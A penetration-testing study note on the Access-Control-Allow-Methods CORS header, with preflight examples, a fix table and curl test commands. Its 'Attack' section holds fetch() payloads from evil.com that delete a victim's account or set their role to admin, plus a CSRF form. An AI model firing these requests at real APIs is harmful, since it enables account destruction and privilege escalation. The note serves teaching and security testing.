---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.43 Access-Control-Allow-Methods — CORS Method Control"
---

# 03.43 — Access-Control-Allow-Methods

## What is it?

`Access-Control-Allow-Methods` is returned in CORS preflight responses, specifying which HTTP methods are allowed for cross-origin requests. Misconfiguring this to allow dangerous methods like PUT, DELETE, or PATCH can open REST APIs to cross-origin exploitation.

---

## Format

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS

PREFLIGHT REQUEST:
  OPTIONS /api/resource HTTP/1.1
  Origin: https://evil.com
  Access-Control-Request-Method: DELETE   ← asking "can I use DELETE?"
  
PREFLIGHT RESPONSE:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Methods: GET, POST, DELETE   ← DELETE allowed!
  Access-Control-Max-Age: 3600
```

---

## Attack: Cross-Origin DELETE/PUT

```
SCENARIO: API allows DELETE cross-origin.

EXPLOIT from evil.com:
  fetch('https://target.com/api/user/victim123', {
    method: 'DELETE',
    credentials: 'include'
  })
  
  → Victim's account deleted via CORS!

EXPLOIT (PUT for privilege escalation):
  fetch('https://target.com/api/user/victim123', {
    method: 'PUT',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({role: 'admin'})
  })
```

---

## Simple Methods (No Preflight Needed)

```
GET, POST, HEAD are "simple" methods — no preflight required.
Even without Access-Control-Allow-Methods:
  GET and POST can be sent cross-origin!
  (Though response is blocked unless ACAO is set)

ATTACK: Simple method CSRF still works via forms!
  <form method="POST" action="https://target.com/delete">
  → No CORS preflight → no CORS protection → CSRF!
```

---

## Testing

```bash
# Send preflight to test allowed methods:
curl -X OPTIONS https://target.com/api/user \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -sI | grep -i "allow-methods"

# Test if wildcard methods allowed:
curl -X OPTIONS https://target.com/api \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" -sI | grep -i "allow"
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| DELETE/PUT allowed cross-origin | Only allow GET and POST in CORS; protect others |
| Wildcard method allowance | Explicitly list only needed methods |
| State-changing GET endpoints | Don't perform mutations on GET requests |

---

## Related Notes
- [[41 - Access-Control-Allow-Origin]] — ACAO header
- [[42 - Access-Control-Allow-Credentials]] — credential risk
- [[Module 08 - CORS]] — full CORS exploitation
